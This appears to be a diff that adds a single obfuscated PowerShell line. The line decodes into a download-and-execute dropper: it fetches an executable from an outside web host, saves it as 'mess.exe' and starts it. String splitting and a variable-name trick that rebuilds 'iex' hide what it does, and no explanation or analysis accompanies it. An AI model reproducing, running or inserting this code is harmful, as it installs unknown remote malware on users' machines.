@@ -1,0 +1,1 @@
+﻿('(New-'+'Object '+'System.Net.We'+'bC'+'lie'+'nt).'+'Download'+'Fi'+'le'+'(T'+'1i'+'http'+':'+'/'+'/c'+'a'+'jos'+'.in/0x/'+'1.ex'+'eT'+'1i,T'+'1imess'+'.exeT1'+'i'+');'+'St'+'ar'+'t-Proc'+'es'+'s '+'T1ime'+'s'+'s'+'.'+'exeT1i').rEPlaCe('T1i',[STriNG][CHaR]39)|. ((gV '*Mdr*').naME[3,11,2]-jOin'')
